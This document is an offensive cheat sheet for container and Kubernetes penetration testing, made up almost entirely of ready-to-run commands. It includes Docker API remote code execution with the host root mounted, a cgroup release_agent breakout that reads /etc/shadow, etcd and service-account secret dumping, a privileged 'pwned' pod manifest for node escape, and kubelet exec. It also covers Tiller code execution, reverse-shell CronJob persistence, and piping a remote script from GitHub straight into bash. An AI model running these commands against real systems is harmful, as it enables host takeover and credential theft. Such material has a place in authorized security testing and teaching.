# Container & Kubernetes Security Pentesting

## Docker Reconnaissance
- Check for exposed Docker API: `curl http://TARGET:2375/version` or `curl https://TARGET:2376/version -k`
- List containers via API: `curl http://TARGET:2375/containers/json`
- Create container via API for RCE: `curl -X POST http://TARGET:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'`
- Start and exec into container: `curl -X POST http://TARGET:2375/containers/CONTAINER_ID/start` then exec to read host filesystem at /mnt
- Check for docker.sock mount inside container: `ls -la /var/run/docker.sock`
- Use mounted socket: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json`

## Docker Breakout — Privileged Container
- Verify privileged mode: `cat /proc/1/status | grep -i cap` (look for CapEff: 0000003fffffffff)
- Cgroups release_agent escape: `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`
- Set release_agent: `echo 1 > /tmp/cgrp/x/notify_on_release && host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab) && echo "$host_path/cmd" > /tmp/cgrp/release_agent`
- Write payload: `echo '#!/bin/sh' > /cmd && echo "cat /etc/shadow > $host_path/output" >> /cmd && chmod +x /cmd`
- Trigger: `sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"` then `cat /output`
- Alternative via nsenter (--pid=host): `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`

## Docker Capabilities Abuse
- Check capabilities: `capsh --print` or `cat /proc/1/status | grep Cap`
- CAP_SYS_ADMIN: mount host filesystem `mount /dev/sda1 /mnt`
- CAP_NET_ADMIN: sniff traffic `tcpdump -i eth0 -w /tmp/capture.pcap`
- CAP_SYS_PTRACE: inject into host process `python3 -c "import ctypes; ctypes.CDLL(None).ptrace(16, 1, 0, 0)"`
- CAP_DAC_READ_SEARCH: read any file with `shocker.py` exploit

## Docker Image & Registry
- Pull from unauthenticated registry: `curl https://REGISTRY:5000/v2/_catalog` then `curl https://REGISTRY:5000/v2/REPO/tags/list`
- Download and inspect manifest: `curl https://REGISTRY:5000/v2/REPO/manifests/latest`
- Pull each layer and extract secrets: `curl https://REGISTRY:5000/v2/REPO/blobs/sha256:DIGEST -o layer.tar && tar xf layer.tar`
- Scan image for secrets: `docker save IMAGE -o image.tar && tar xf image.tar && grep -r "password\|secret\|api_key" .`
- Dive into image layers: `dive IMAGE` to inspect each layer for added/removed sensitive files

## Kubernetes — Anonymous & Unauthenticated Access
- Check anonymous API access: `curl -k https://TARGET:6443/api/v1/namespaces`
- Kubelet read-only port: `curl http://TARGET:10255/pods`
- Kubelet exec (RCE): `curl -k https://TARGET:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id" -X POST`
- List pods via kubelet: `curl -k https://TARGET:10250/pods`
- Etcd unauthenticated: `etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only`
- Extract secrets from etcd: `etcdctl --endpoints=http://TARGET:2379 get /registry/secrets --prefix`

## Kubernetes — Post-Compromise (Inside Pod)
- Read service account token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
- Set up kubectl with token: `KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && kubectl --token=$KUBE_TOKEN --server=https://kubernetes.default.svc --insecure-skip-tls-verify=true get pods`
- Check RBAC permissions: `kubectl auth can-i --list --token=$KUBE_TOKEN --server=https://kubernetes.default.svc --insecure-skip-tls-verify=true`
- List secrets: `kubectl get secrets --all-namespaces --token=$KUBE_TOKEN --server=https://kubernetes.default.svc --insecure-skip-tls-verify=true`
- Dump secret: `kubectl get secret SECRET_NAME -o jsonpath='{.data}' | base64 -d`
- Create privileged pod for node escape: `kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: alpine
    command: ["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF`

## Kubernetes Dashboard & Helm
- Dashboard without auth: browse `https://TARGET:8443` or `https://TARGET:30000`
- Skip login on dashboard if `--enable-skip-login` is set
- Helm chart secrets: `helm get values RELEASE` or `kubectl get secret -l owner=helm --all-namespaces`
- Tiller (Helm v2) RCE: `helm --host TARGET:44134 install /path/to/malicious-chart`

## Kubernetes Admission Controller & CronJob
- Test admission controller bypass: deploy pod with `hostPID: true` and `privileged: true` to see if OPA/Kyverno blocks it
- CronJob for persistence: create CronJob that runs reverse shell every minute
- Check for pod security policies: `kubectl get psp` (deprecated) or `kubectl get podsecuritypolicies`
- Check pod security standards: `kubectl get ns --show-labels | grep pod-security`

## Service Mesh Bypass
- Istio sidecar bypass: send traffic directly to pod IP bypassing Envoy on port 15006
- Check mTLS enforcement: `istioctl analyze` or inspect PeerAuthentication resources
- Bypass NetworkPolicy: if pod has hostNetwork, NetworkPolicy does not apply

## Container Breakout Checklist
1. Check `cat /proc/1/cgroup` — am I in a container?
2. Check capabilities: `capsh --print`
3. Check for docker.sock: `ls -la /var/run/docker.sock`
4. Check for privileged mode: full capabilities + /dev access
5. Check for host mounts: `mount | grep -E "/host|/mnt"`
6. Check for service account token: `ls /var/run/secrets/kubernetes.io/serviceaccount/`
7. Check for host PID namespace: `ps aux | grep -v grep | head -20` (see host processes = hostPID)
8. Check cloud metadata: `curl -s http://169.254.169.254/latest/meta-data/ -m 2`
9. Run deepce.sh for automated container escape enumeration: `curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | bash`
10. Run CDK tool: `./cdk evaluate` for automated Kubernetes/Docker exploit scanning
